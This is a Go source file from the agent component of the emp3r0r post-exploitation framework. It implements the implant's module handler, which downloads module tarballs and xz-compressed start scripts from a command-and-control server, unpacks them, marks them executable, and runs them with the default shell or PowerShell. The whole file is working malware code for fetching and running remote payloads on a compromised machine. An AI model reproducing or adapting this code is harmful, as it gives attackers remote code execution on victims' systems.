package agent

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/mholt/archives"
)

// moduleHandler downloads and runs modules from C2
func moduleHandler(modName, checksum string) (out string) {
	tarball := filepath.Join(RuntimeConfig.AgentRoot, modName+".tar.xz")
	modDir := filepath.Join(RuntimeConfig.AgentRoot, modName)
	startScript := fmt.Sprintf("%s.%s", modName, getScriptExtension())

	// cd to module dir
	cwd, err := os.Getwd()
	if err != nil {
		return fmt.Sprintf("getwd: %v", err)
	}
	defer os.Chdir(cwd)
	os.Chdir(modDir)

	// in memory execution?
	inMem := checksum == "in_mem"

	if !inMem {
		if downloadErr := downloadAndVerifyModule(tarball, checksum); downloadErr != nil {
			return downloadErr.Error()
		}

		if extractErr := extractAndRunModule(modDir, tarball); extractErr != nil {
			return extractErr.Error()
		}
	}

	out, err = runStartScript(startScript, modDir)
	if err != nil {
		return fmt.Sprintf("running start script: %v: %s", err, out)
	}
	return out
}

func getScriptExtension() string {
	if runtime.GOOS == "windows" {
		return "ps1"
	}
	return "sh"
}

func downloadAndVerifyModule(tarball, checksum string) error {
	if tun.SHA256SumFile(tarball) != checksum {
		if _, err := DownloadViaCC(tarball, tarball); err != nil {
			return err
		}
	}

	if tun.SHA256SumFile(tarball) != checksum {
		log.Print("Checksum failed, restarting...")
		os.RemoveAll(tarball)
		return downloadAndVerifyModule(tarball, checksum) // Recursive call
	}
	return nil
}

func extractAndRunModule(modDir, tarball string) error {
	os.RemoveAll(modDir)
	if err := util.Unarchive(tarball, RuntimeConfig.AgentRoot); err != nil {
		return fmt.Errorf("unarchive module tarball: %v", err)
	}

	return processModuleFiles(modDir)
}

func processModuleFiles(modDir string) error {
	files, err := os.ReadDir(modDir)
	if err != nil {
		return fmt.Errorf("processing module files: %v", err)
	}

	for _, f := range files {
		if err := os.Chmod(filepath.Join(modDir, f.Name()), 0o700); err != nil {
			return fmt.Errorf("setting permissions for %s: %v", f.Name(), err)
		}

		libsTarball := filepath.Join(modDir, "libs.tar.xz")
		if util.IsExist(libsTarball) {
			os.RemoveAll(filepath.Join(modDir, "libs"))
			if err := util.Unarchive(libsTarball, modDir); err != nil {
				return fmt.Errorf("unarchive %s: %v", libsTarball, err)
			}
		}
	}
	return nil
}

func runStartScript(startScript, modDir string) (string, error) {
	// Download the script payload
	payload, err := DownloadViaCC(startScript, "")
	if err != nil {
		return "", fmt.Errorf("downloading %s: %w", startScript, err)
	}

	// Decompress the payload using XZ
	decompressedPayload, err := decompressXZ(payload, startScript)
	if err != nil {
		return "", err
	}

	log.Printf("Running %s:\n%s...", startScript, decompressedPayload[:100])
	if runtime.GOOS == "windows" {
		return RunModuleScript(decompressedPayload)
	}

	// otherwise save the file and run it
	cwd, err := os.Getwd()
	if err != nil {
		return "", fmt.Errorf("getwd: %v", err)
	}
	if cwd != modDir {
		os.Chdir(modDir)
		defer os.Chdir(cwd)
	}
	scriptPath := filepath.Join(modDir, startScript)
	// write script to file
	if err := os.WriteFile(scriptPath, decompressedPayload, 0o700); err != nil {
		return "", fmt.Errorf("writing %s: %v", startScript, err)
	}
	cmd := exec.Command(emp3r0r_data.DefaultShell, scriptPath)
	out, err := cmd.CombinedOutput()
	if err != nil {
		err = fmt.Errorf("running %s: %v: %s", startScript, err, out)
		return string(out), err
	}
	return string(out), nil
}

// decompressXZ handles decompression of a payload.
func decompressXZ(payload []byte, source string) ([]byte, error) {
	r := bytes.NewReader(payload)

	// Wrap the reader with XZ decompressor
	decompressor, err := archives.Xz{}.OpenReader(r)
	if err != nil {
		return nil, fmt.Errorf("decompressing %s: %w", source, err)
	}
	defer decompressor.Close()

	// Read all decompressed data
	decompressedPayload, err := io.ReadAll(decompressor)
	if err != nil {
		return nil, fmt.Errorf("reading decompressed %s: %w", source, err)
	}
	return decompressedPayload, nil
}
